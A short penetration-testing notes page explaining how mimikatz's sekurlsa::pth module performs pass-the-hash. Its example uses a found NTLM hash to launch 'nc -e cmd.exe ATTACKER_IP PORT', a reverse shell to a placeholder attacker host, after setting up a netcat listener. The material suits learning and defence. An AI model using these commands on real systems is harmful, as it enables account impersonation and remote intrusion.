# pass-the-hash

{% embed url="https://www.praetorian.com/blog/inside-mimikatz-part1/" %}

{% embed url="https://www.praetorian.com/blog/inside-mimikatz-part2/" %}

### Overview of how `mimikatz` implements the pass-the-hash technique

I aim to provide a general high-level overview of how the `sekurlsa::pth` module works to allow an attacker to impersonate a user.&#x20;

Generally, it works by overwriting stored credential material for the current session, or spawn new processes using certain Windows APIs to associate the attacker's provided credentials for that session.&#x20;

#### Example

Suppose we have found a user's NTLM hash using the `lsadump::sam` or `sekurlsa::msv` methods. We can use the found hash to retrieve a shell session as the found user.

First, we need to establish a listener to catch the shell:

```sh
$ nc -lvnp PORT
```

Next, perform the attack:

{% code overflow="wrap" %}
```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:"nc -e cmd.exe ATTACKER_IP PORT" 
```
{% endcode %}

Note that if we execute the `whoami` command, we will still see the original user we were using before performing the attack, but any commands executed from this session will use the injected credentials.

